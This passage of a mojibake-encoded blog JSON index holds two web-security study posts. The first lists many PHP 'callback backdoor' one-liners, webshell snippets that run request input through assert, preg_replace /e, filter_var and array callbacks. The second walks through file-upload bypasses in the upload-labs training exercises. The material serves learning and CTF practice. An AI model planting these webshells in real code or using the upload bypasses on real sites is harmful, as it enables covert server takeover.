https://www.freebuf.com/articles/web/135342.html","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"ssrf","slug":"ssrf","permalink":"http://ca0y1h.top/tags/ssrf/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹å›è°ƒåé—¨","date":"2019-12-03T04:55:46.000Z","path":"Web_security/php_related/1.PHPå›è°ƒåé—¨/","text":"Webå®‰å…¨å­¦ä¹ ä¹‹PHPå›è°ƒåé—¨ åœ¨åšä¸€é“CTFæ¸—é€ç±»å‹çš„é¢˜ç›®æ—¶ï¼Œåšåˆ°æœ€åä¸€æ­¥çœ‹åˆ°äº†array_walk()å‡½æ•°ï¼Œäºæ˜¯ç›´æ¥Googleè¿™ä¸ªå‡½æ•°æ¼æ´ï¼Œæœç„¶å­˜åœ¨ç€å›è°ƒåé—¨ï¼ˆè²Œä¼¼æ˜¯Pç‰›èµ·çš„è¿™ä¸ªåå­—ï¼‰ï¼Œåœ¨æ­¤å»¶ç”³ä¸€ä¸‹çŸ¥è¯†ç‚¹åšä¸€ä¸ªè®°å½•ã€‚ ä»€ä¹ˆæ˜¯å›è°ƒå‡½æ•° å›è°ƒå‡½æ•°å°±æ˜¯å°†ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥å¦ä¸€ä¸ªå‡½æ•°çš„å‡½æ•°ã€‚phpä¸­æœ‰è®¸å¤šè¿™æ ·çš„å‡½æ•°ï¼Œæ¯”å¦‚call_user_func , call_user_func_array,array_mapç­‰ç­‰ï¼Œè¿™äº›å‡½æ•°å¯ä»¥å°†å‡½æ•°ä½œä¸ºå‚æ•°æ‰§è¡Œåè¿”å›ä¸»å‡½æ•°ï¼Œæ–¹ä¾¿ä½¿ç”¨ï¼Œä½†æ˜¯æ—¢ç„¶å¯ä»¥å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥æ‰§è¡Œï¼Œå¦‚æœå°†ä¸€äº›å±é™©çš„å‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œé‚£å°±æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªå¯åˆ©ç”¨ä¸”ä¸æ˜“æ£€æµ‹çš„åé—¨ã€‚ ä¼ ç»Ÿçš„å›è°ƒåé—¨ call_user_func()åœ¨PHPä¸­æ˜¯å›è°ƒçš„æ ‡å‡†çš„å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•° callback æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œè¿”å›å€¼ä¸ºå›è°ƒå‡½æ•°çš„ç»“æœã€‚ 1call_user_func(&#x27;assert&#x27;, $_REQUEST[&quot;pass&quot;]); assert()å‡½æ•°ç›´æ¥ä½œä¸ºå›è°ƒå‡½æ•°ï¼Œç„¶å$_REQUEST[&quot;pass&quot;]ä½œä¸ºassertå‚æ•°è°ƒç”¨ã€‚ å¦å¤–ï¼ŒPHPè¿˜æä¾›å¦å¤–ä¸€ä¸ªç›¸ä¼¼çš„å‡½æ•°call_user_func_array()ï¼š 1call_user_func_array(&#x27;assert&#x27;, array($_REQUEST[&#x27;pass&#x27;])); call_user_func_arrayå‡½æ•°ï¼Œå’Œcall_user_funcç±»ä¼¼ï¼Œåªæ˜¯ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥ä¼ å…¥å‚æ•°åˆ—è¡¨ç»„æˆçš„æ•°ç»„ã€‚ å•ä¸ªå‚æ•°å›è°ƒåé—¨ æ³¨æ„ï¼šè¿™é‡Œçš„å•ä¸ªå‚æ•°æŒ‡çš„æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ä¸ªæ•° å…¶å®ï¼Œåœ¨PHPä¸­è¿˜æœ‰å¾ˆå¤šå›è°ƒå‡½æ•°ï¼Œè¿™äº›å«æœ‰å›è°ƒï¼ˆcallableç±»å‹ï¼‰å‚æ•°çš„å‡½æ•°ï¼Œå…¶å®éƒ½æœ‰åšâ€œå›è°ƒåé—¨â€çš„æ½œåŠ›ã€‚ ä¾‹å¦‚array_filter()å‡½æ•°ï¼š array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) ä¾æ¬¡å°† array æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ° callback å‡½æ•°ã€‚å¦‚æœ callback å‡½æ•°è¿”å› trueï¼Œåˆ™ array æ•°ç»„çš„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›çš„ç»“æœæ•°ç»„ä¸­ã€‚æ•°ç»„çš„é”®åä¿ç•™ä¸å˜ã€‚ 123$e = $_REQUEST[&#x27;e&#x27;];$arr = array($_POST[&#x27;pass&#x27;],);array_filter($arr, base64_decode($e)); array_filterå‡½æ•°æ˜¯å°†æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ éå†å¹¶ç”¨æŒ‡å®šå‡½æ•°å¤„ç†è¿‡æ»¤ç”¨çš„ï¼Œarræ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½ä¼šä½œä¸ºbase64è§£ç åå‡½æ•°eçš„å‚æ•°ã€‚å¦‚ä¸‹å›¾ï¼š ç±»ä¼¼array_filterï¼Œarray_mapä¹Ÿæœ‰ç›¸åŒçš„åŠŸæ•ˆï¼š 123$e = $_REQUEST[&#x27;e&#x27;];$arr = array($_POST[&#x27;pass&#x27;],);array_map(base64_decode($e), $arr); å•å‚æ•°åé—¨çš„ç»ˆæå¥¥ä¹‰ï¼š 123&lt;?php$e = $_REQUEST[&#x27;e&#x27;];register_shutdown_function($e, $_REQUEST[&#x27;pass&#x27;]); 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];declare(ticks=1);register_tick_function ($e, $_REQUEST[&#x27;pass&#x27;]); 123&lt;?phpfilter_var($_REQUEST[&#x27;pass&#x27;], FILTER_CALLBACK, array(&#x27;options&#x27; =&gt; &#x27;assert&#x27;));filter_var_array(array(&#x27;test&#x27; =&gt; $_REQUEST[&#x27;pass&#x27;]), array(&#x27;test&#x27; =&gt; array(&#x27;filter&#x27; =&gt; FILTER_CALLBACK, &#x27;options&#x27; =&gt; &#x27;assert&#x27;))); æœ€åä¸€ä¸ªæ˜¯filter_varçš„åˆ©ç”¨ï¼ŒPHPé‡Œç”¨è¿™ä¸ªå‡½æ•°æ¥è¿‡æ»¤æ•°ç»„ï¼Œåªè¦æŒ‡å®šè¿‡æ»¤æ–¹æ³•ä¸ºå›è°ƒï¼ˆFILTER_CALLBACKï¼‰ï¼Œä¸”optionä¸ºassertå³å¯ã€‚ ä¸¤ä¸ªå‚æ•°å›è°ƒåé—¨ åœ¨PHP5.4.8+ç‰ˆæœ¬ä¸­ï¼Œassertæœ‰ä¸€ä¸ªæ–°çš„å¯é€‰å‚æ•°descritionã€‚ å…·ä½“å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š assert ( mixed $assertion [, string $description ] ) : bool æ‰€ä»¥è¾ƒäºä¹‹å‰çš„PHPç‰ˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›æ–°çš„æ–¹å¼å»è¿›è¡Œè°ƒç”¨ï¼š 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];$arr = array(&#x27;test&#x27;, $_REQUEST[&#x27;pass&#x27;]);uasort($arr, base64_decode($e)); æ³¨æ„ï¼š$arræ•°ç»„ä¸­çš„å…ƒç´ éƒ½æ˜¯å›è°ƒå‡½æ•°$eçš„å‚æ•°ï¼ åœ¨PHP5.4.8ä»¥ä¸Šç‰ˆæœ¬å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼š è¿˜æœ‰ä¸€äº›ç±»ä¼¼çš„å‡½æ•°ï¼Œæ¯”å¦‚è¯´uksort()ï¼š å…·ä½“å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š uksort ( array &amp;$array , callable $key_compare_func ) : bool 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];$arr = array(&#x27;test&#x27;, $_REQUEST[&#x27;pass&#x27;]);uksort($arr, base64_decode($e)); ä»¥åŠé¢å‘å¯¹è±¡çš„æ–¹æ³•ï¼š 12345678&lt;?php// way 0$arr = new ArrayObject(array(&#x27;test&#x27;, $_REQUEST[&#x27;pass&#x27;]));$arr-&gt;uasort(&#x27;assert&#x27;);// way 1$arr = new ArrayObject(array(&#x27;test&#x27; =&gt; 1, $_REQUEST[&#x27;pass&#x27;] =&gt; 2));$arr-&gt;uksort(&#x27;assert&#x27;); å†æ¯”å¦‚array_reduce()ï¼š PHP 4 &gt;= 4.0.5, PHP 5, PHP 7) array_reduce â€” ç”¨å›è°ƒå‡½æ•°è¿­ä»£åœ°å°†æ•°ç»„ç®€åŒ–ä¸ºå•ä¸€çš„å€¼ 1array_reduce($arr = array(&#x27;&#x27;), base64_decode($_REQUEST[&#x27;e&#x27;]), $_REQUEST[&#x27;a&#x27;]); array_udiff()å‡½æ•° (PHP 5, PHP 7) array_udiff â€” ç”¨å›è°ƒå‡½æ•°æ¯”è¾ƒæ•°æ®æ¥è®¡ç®—æ•°ç»„çš„å·®é›† 1array_udiff($arr = array($_REQUEST[&#x27;a&#x27;]), $arr1 = array(&#x27;&#x27;), base64_decode($_REQUEST[&#x27;e&#x27;])); ä¸‰ä¸ªå‚æ•°å›è°ƒåé—¨ æœ‰äº›å‡½æ•°éœ€è¦çš„å›è°ƒå‡½æ•°ç±»å‹æ¯”è¾ƒè‹›åˆ»ï¼Œå›è°ƒæ ¼å¼éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œæ¯”å¦‚array_walk()ã€‚ å‡½æ•°å®šä¹‰ï¼šarray_walk ( array &amp;$array , callable$callback [, mixed $userdata = NULL ] ) : bool å®ƒçš„å‚æ•°è§£é‡Šï¼š ä¸‰ä¸ªå‚æ•°å¯ä»¥ç”¨preg_replace()ã€‚ 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];$arr = array($_POST[&#x27;pass&#x27;] =&gt; &#x27;|.*|e&#x27;,);array_walk($arr, $e, &#x27;&#x27;); æ‰§è¡Œæ•ˆæœå¦‚ä¸‹å›¾ï¼š éœ€è¦å¯¹è¿™æ®µä»£ç åšå‡ºä¸€å®šçš„è§£é‡Šï¼š preg_replace å‡½æ•°æ˜¯ç”¨æ¥æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼Œå®ƒçš„å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed æ ¹æ®array_walk()å‚æ•°è§£é‡Šå¯ä»¥å¾—å‡ºï¼Œarray_walk($arr, $e, '');ç­‰ä»·äºï¼š 1preg_replace(&#x27;|.*|e&#x27;, &#x27;phpinfo()&#x27;, &#x27;&#x27;); ç¬¬ä¸€ä¸ªå‚æ•°|.*|eè¡¨ç¤ºçš„æ˜¯\\eæ¨¡å¼åŒ¹é…ï¼Œå³ä¼šæŠŠreplacementå‚æ•°å½“ä½œPHPè¯­å¥æ¥æ‰§è¡Œï¼Œ.*æ˜¯è´ªå©ªåŒ¹é…ã€‚ é™¤äº†array_walk()ï¼Œè¿˜å¯ä»¥ä½¿ç”¨array_walk_recurcive()ï¼Œå‚æ•°çš„ä½ç½®éƒ½æ˜¯ä¸€æ ·çš„ï¼š 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];$arr = array($_POST[&#x27;pass&#x27;] =&gt; &#x27;|.*|e&#x27;,);array_walk_recursive($arr, $e, &#x27;&#x27;); çœ‹äº†ä»¥ä¸Šå‡ ä¸ªå›è°ƒåé—¨ï¼Œå‘ç°preg_replace()ç¡®å®å¥½ç”¨ã€‚ä½†æ˜¾ç„¶å¾ˆå¤šWAFéƒ½ä¼šå¯¹å…¶æœ‰æ‰€é˜²å¤‡ã€‚å…¶å®PHPé‡Œä¸æ­¢è¿™ä¸ªå‡½æ•°å¯ä»¥æ‰§è¡Œevalçš„åŠŸèƒ½ï¼Œè¿˜æœ‰å‡ ä¸ªç±»ä¼¼çš„ï¼š 12&lt;?phpmb_ereg_replace(&#x27;.*&#x27;, $_REQUEST[&#x27;pass&#x27;], &#x27;&#x27;, &#x27;e&#x27;); å¦å¤–ä¸€ä¸ªï¼š 12&lt;?phpecho preg_filter(&#x27;|.*|e&#x27;, $_REQUEST[&#x27;pass&#x27;], &#x27;&#x27;); Reference åˆ›é€ tipsçš„ç§˜ç±â€”â€”PHPå›è°ƒåé—¨","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"å›è°ƒåé—¨","slug":"å›è°ƒåé—¨","permalink":"http://ca0y1h.top/tags/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨","date":"2019-12-03T04:36:13.000Z","path":"Web_security/basic_learning/16.æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨/","text":"Webå®‰å…¨å­¦ä¹ ä¹‹æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨ åœ¨ç°ä»£äº’è”ç½‘çš„Webåº”ç”¨ç¨‹åºä¸­ï¼Œä¸Šä¼ æ–‡ä»¶æ˜¯ä¸€ç§å¸¸è§çš„åŠŸèƒ½ï¼Œå› ä¸ºå®ƒæœ‰åŠ©äºæé«˜ä¸šåŠ¡æ•ˆç‡ï¼Œç„¶è€Œå‘ç”¨æˆ·æä¾›çš„åŠŸèƒ½è¶Šå¤šï¼ŒWebåº”ç”¨å—åˆ°æ”»å‡»çš„é£é™©å°±è¶Šå¤§ï¼Œå¦‚æœWebåº”ç”¨å­˜åœ¨ä¸Šä¼ æ–‡ä»¶æ¼æ´ï¼Œé‚£ä¹ˆæ¶æ„ç”¨æˆ·å°±å¯ä»¥åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´å°†å¯æ‰§è¡Œè„šæœ¬ç¨‹åºä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸­ï¼Œè·å¾—ç½‘ç«™æƒé™ã€‚ æ–‡ä»¶ä¸Šä¼ æ¼æ´ä»‹ç» åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸€èˆ¬éƒ½æ˜¯æŒ‡â€œä¸Šä¼ Webè„šæœ¬èƒ½å¤Ÿè¢«æœåŠ¡å™¨è§£æâ€çš„é—®é¢˜ã€‚è¦å®Œæˆè¿™ä¸ªæ”»å‡»ï¼Œéœ€è¦æ»¡è¶³å¦‚ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š ä¸Šä¼ çš„æ–‡ä»¶åæ‰€åœ¨çš„ç›®å½•è¦æ˜¯Webå®¹æ˜“èƒ½å¤Ÿè¦†ç›–åˆ°çš„è·¯å¾„ï¼Œå¯ä»¥è¢«Webå®¹å™¨è§£é‡Šæ‰§è¡Œã€‚ ç”¨æˆ·èƒ½å¤Ÿä»Webä¸Šè®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚ ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ä¸ä¼šè¢«å®‰å…¨æ£€æŸ¥ã€æ ¼å¼åŒ–ã€å›¾ç‰‡å‹ç¼©ç­‰åŠŸèƒ½æ”¹å˜äº†å†…å®¹ã€‚ æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨ æœ¬æ–‡ç»“åˆupload-labsæ¥å¯¹æ­¤ç§æ¼æ´åœ¨PHPä¸­çš„è¡¨ç°åšä¸€è®²è§£ã€‚ Pass-01 å‰ç«¯JSæ£€éªŒç»•è¿‡ ä»£ç  1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; &#125; //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = &quot;.jpg|.png|.gif&quot;; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123; var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; &#125;&#125; è¿™æ˜¯ä¸€ä¸ªå‰ç«¯éªŒè¯çš„ä¸Šä¼ ç‚¹ï¼Œé’ˆå¯¹è¿™ç§æƒ…å†µæˆ‘ä»¬ä¸€èˆ¬æœ‰ä»¥ä¸‹3ç§ç»•è¿‡æ–¹æ³•ã€‚ ç»•è¿‡æ–¹å¼ ç¦ç”¨JSä»£ç  Chromeæµè§ˆå™¨åœ¨æ§åˆ¶å°çš„è®¾ç½®ä¸­å¯ä»¥ç›´æ¥ç¦ç”¨JSä»£ç ã€‚ åˆ é™¤ä¸Šä¼ æŒ‰é’®çš„onsubmitå±æ€§ Burpä¿®æ”¹åç¼€ å…ˆå°†æƒ³è¦ä¸Šä¼ çš„phpè„šæœ¬çš„åç¼€ä¿®æ”¹ä¸ºjpgç»•è¿‡å‰ç«¯ï¼Œä½¿ç”¨burpæˆªæ–­åä¿®æ”¹jpgä¸ºphpç»§ç»­ä¸Šä¼ å³å¯ã€‚ Pass-02 MIMEç±»å‹ç»•è¿‡ ä»£ç  12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç™½åå•çš„æ–¹å¼æ£€æŸ¥Content-Typeï¼Œä½¿ç”¨MIMEç»•è¿‡ã€‚ ç»•è¿‡æ–¹å¼ MIME åœ¨å®¢æˆ·ç«¯ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œé€šè¿‡BurpæŠ“å–æ•°æ®åŒ…ï¼Œå½“ä¸Šä¼ ä¸€ä¸ªphpæ ¼å¼çš„æ–‡ä»¶æ—¶ï¼Œå¯ä»¥çœ‹åˆ°æ•°æ®åŒ…ä¸­çš„Content-Typeçš„å€¼æ—¶application/ostet-streamï¼Œè€Œä¸Šä¼ jpgæ ¼å¼çš„æ–‡ä»¶æ—¶ï¼Œæ•°æ®åŒ…ä¸­Content-Typeçš„å€¼æ˜¯image/jpegã€‚ ä¸Šä¼ phpæ ¼å¼æ–‡ä»¶ï¼š ä¸Šä¼ jpgæ ¼å¼æ–‡ä»¶ï¼š æ‰€ä»¥å¯¹äºè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨burpæŠ“åŒ…å¹¶ä¿®æ”¹Content-Typeå­—æ®µçš„å†…å®¹å³å¯ã€‚ Pass-03 åˆ©ç”¨ç‰¹æ®Šåç¼€åç»•è¿‡ ä»£ç  123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ä»…ä»…è¿‡æ»¤äº†.aspã€.aspxã€.phpã€.jspåç¼€æ–‡ä»¶ï¼Œå¯ä»¥æ›´æ”¹httpd.confä½¿å¾—å¯ä»¥è§£æ.php2ç±»ä¼¼çš„åç¼€æ–‡ä»¶ã€‚ ç»•è¿‡æ–¹å¼ httpd.confé…ç½®æ–‡ä»¶ ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶åï¼Œæç¤ºä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼ æ¨¡æ‹Ÿä¸€ä¸‹çœŸå®æ“ä½œï¼ŒF12æŸ¥çœ‹Response Headerï¼ŒæœåŠ¡å™¨ç«¯æ˜¯Apache+PHP 5.2.17ï¼Œä½¿ç”¨é»‘åå•çš„æ–¹å¼è¿‡æ»¤äº† .asp,.aspx,.php,.jspæ–‡ä»¶åç¼€ã€‚ä½†æ˜¯æœ‰äº›Apacheæ˜¯å…è®¸è§£æå…¶ä»–æ–‡ä»¶åç¼€çš„ï¼Œä¾‹å¦‚åœ¨httpd.confä¸­ï¼Œå¦‚æœé…ç½®æœ‰å¦‚ä¸‹ä»£ç ï¼Œåˆ™èƒ½å¤Ÿè§£æphpã€php3å’Œphtmlã€‚ 1AddType application&#x2F;x-httpd-php .php .php3 .phtml æ‰€ä»¥æˆ‘ä»¬è¿™æ—¶åªéœ€è¦å°†æ–‡ä»¶åä¿®æ”¹ä¸º.php3å°±å¯ä»¥æˆåŠŸä¸Šä¼ shellã€‚ è§£æé¡ºåº åœ¨Apacheçš„è§£æé¡ºåºä¸­ï¼Œæ˜¯ä»å³åˆ°å·¦å¼€å§‹è§£ææ–‡ä»¶åç¼€çš„ï¼Œå¦‚æœæœ€å³ä¾§çš„æ‰©å±•åä¸å¯è¯†åˆ«ï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ï¼Œç›´åˆ°é‡åˆ°å¯ä»¥è§£æçš„æ–‡ä»¶åç¼€ä¸ºæ­¢ï¼Œæ‰€ä»¥å¦‚æœä¸Šä¼ çš„æ–‡ä»¶åç±»ä¼¼1.php.xxxxï¼Œå› ä¸ºåç¼€xxxxä¸å¯è§£æï¼Œæ‰€ä»¥å‘å·¦è§£æåç¼€phpã€‚ Pass-04 åˆ©ç”¨.htaccessç»•è¿‡ ä»£ç  123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; é»‘åå•è¿‡æ»¤äº†ä¸€å¤§å †æ–‡ä»¶åï¼Œè€ƒè™‘ä¸Šä¼ .htaccessæ–‡ä»¶ä½¿å¾—Apacheå¯ä»¥å°†jpgæ–‡ä»¶è§£ææˆphpæ–‡ä»¶ã€‚ ç»•è¿‡æ–¹å¼ è§£æé¡ºåº åŒPass-03 .htaccessæ–‡ä»¶ ä»€ä¹ˆæ˜¯.htaccessï¼Ÿ .htaccessæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œé‡Œé¢å­˜æ”¾ApacheæœåŠ¡å™¨é…ç½®ç›¸å…³æŒ‡ä»¤ï¼› .htaccessä¸»è¦çš„ä½œç”¨æœ‰ï¼šURLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€MIMEç±»å‹é…ç½®ä»¥åŠè®¿é—®æƒé™æ§åˆ¶ç­‰ã€‚ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨ã€å›¾ç‰‡é˜²ç›—é“¾ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µã€ç›®å½•æµè§ˆä¸ä¸»é¡µã€ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹ã€æ–‡ä»¶å¯†ç ä¿æŠ¤ç­‰ï¼› 